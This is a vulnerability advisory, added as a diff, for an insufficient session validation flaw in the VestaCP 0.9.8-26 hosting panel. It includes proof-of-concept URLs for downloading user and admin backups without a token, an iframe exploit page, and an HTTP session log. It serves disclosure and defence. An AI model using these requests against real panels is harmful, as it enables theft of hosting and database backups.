@@ -1,0 +1,258 @@
+# Exploit Title: VestaCP 0.9.8-26 - 'backup' Information Disclosure
+# Date: 2020-11-25
+# Exploit Author: Vulnerability-Lab
+# Vendor Homepage: https://vestacp.com/
+# Software Link: https://vestacp.com/install/
+# Version: 0.9.8-26
+
+Document Title:
+===============
+VestaCP v0.9.8-26 - Insufficient Session Validation Web Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2238
+
+
+Release Date:
+=============
+2020-11-25
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2238
+
+
+Common Vulnerability Scoring System:
+====================================
+7
+
+
+Vulnerability Class:
+====================
+Insufficient Session Validation
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Web interface is open source php and javascript interface based on Vesta
+open API, it uses 381 vesta CLI calls.
+The GNU General Public Licence is a free, copyleft licence for software
+and other kinds of works. Its free to change,
+modify and redistribute source code.
+
+(Copy of the Homepage: https://vestacp.com/features/ &
+https://vestacp.com/install/ )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered a
+insufficient session validation vulnerability in the VestaCP v0.9.8-26
+hosting web-application.
+
+
+Affected Product(s):
+====================
+Vesta
+Product: VestaCP v0.9.8-26 - Hosting Control Panel (Web-Application)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-04: Researcher Notification & Coordination (Security Researcher)
+2020-05-05: Vendor Notification (Security Department)
+2020-05-07: Vendor Response/Feedback (Security Department)
+2020-**-**: Vendor Fix/Patch (Service Developer Team)
+2020-**-**: Security Acknowledgements (Security Department)
+2020-11-25: Public Disclosure (Vulnerability Laboratory)
+
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Authentication Type:
+====================
+Restricted Authentication (Guest Privileges)
+
+
+User Interaction:
+=================
+No User Interaction
+
+
+Disclosure Type:
+================
+Full Disclosure
+
+
+Technical Details & Description:
+================================
+An insufficient session validation vulnerability has been discovered in
+the official VestaCP (Control Panel) v0.9.8-26 hosting web-application.
+The vulnerability allows remote attackers to gain sensitive
+web-application data or information without permission, authentication
+or authorization.
+
+The backup url includes a token parameter for the download request on
+backups. The mechanism is to secure that other users can only download the
+backup with the token to confirm the permission. The token is not
+required for the download and can be deattached in the client-side
+session request.
+The session validation of the backup download request is insufficient
+validating the request without token parameter approval. Next to that
+the backup
+uses the name of the privileges in combination with the date in a tar
+compressed folder. Thus allows a remote attacker with low user
+privileges to
+download the backup data without permission.
+
+Successful exploitation of the session web vulnerability results in
+information disclosure of the local application and dbms backup files.
+
+Request Method(s):
+[+] GET
+
+Vulnerable Module(s):
+[+] /download/backup/
+
+Vulnerable Parameter(s):
+[+] token
+
+Affected Parameter(s):
+[+] backup
+
+
+Proof of Concept (PoC):
+=======================
+The insufficient session validation vulnerability can be exploited by
+remote attackers with simple user privileges without user interaction.
+For security demonstration or to reproduce the information disclosure
+issue follow the provided information and steps below to continue.
+
+
+Request: Default (Download Backup)
+https://vestacp.localhost:8083/download/backup/?backup=user.2020-04-28_00-00-17.tar&token=d6f4a3a923ab5c60ef0a52995245a3d4
+https://vestacp.localhost:8083/download/backup/?backup=admin.2020-04-28_00-00-17.tar&token=d6f4a3a923ab5c60ef0a52995245a3d4
+
+
+PoC: Exploitation
+https://vestacp.localhost:8083/download/backup/?backup=[USER/ADMIN].[YYYY-MM-DD_HH-MM-SS].tar
+https://vestacp.localhost:8083/download/backup/?backup=user.2020-04-28_00-00-17.tar
+https://vestacp.localhost:8083/download/backup/?backup=admin.2020-04-28_00-00-17.tar
+
+
+PoC: Exploit
+<html>
+<head><body>
+<title>VestaCP (Control Panel) v0.9.8-26 - Information Disclosure
+(Backup)</title>
+<iframe
+src=https://vestacp.localhost:8083/download/backup/?backup=[USER/ADMIN].[YYYY-MM-DD_HH-MM-SS].tar>
+</body></head>
+<html>
+
+
+--- PoC Session Logs [GET] ---
+https://vestacp.localhost:8083/download/backup/?backup=user.2020-**-**_00-00-17.tar
+Host: vestacp.localhost:8083
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: PHPSESSID=4neq25hga91vqrf4maktd4q073;
+-
+GET: HTTP/1.1 200 OK
+Server: nginx
+Content-Type: application/gzip
+Content-Length: 3891200
+Connection: keep-alive
+Content-Disposition: attachment; filename="user.2020-**-**_00-00-17.tar";
+Accept-Ranges: bytes
+
+
+Reference(s):
+https://vestacp.localhost:8083/
+https://vestacp.localhost:8083/download/
+https://vestacp.localhost:8083/download/backup/
+https://vestacp.localhost:8083/download/backup/?backup
+
+
+Security Risk:
+==============
+The security risk of the session validation web vulnerability in the
+vestacp web-application is estimated as high.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
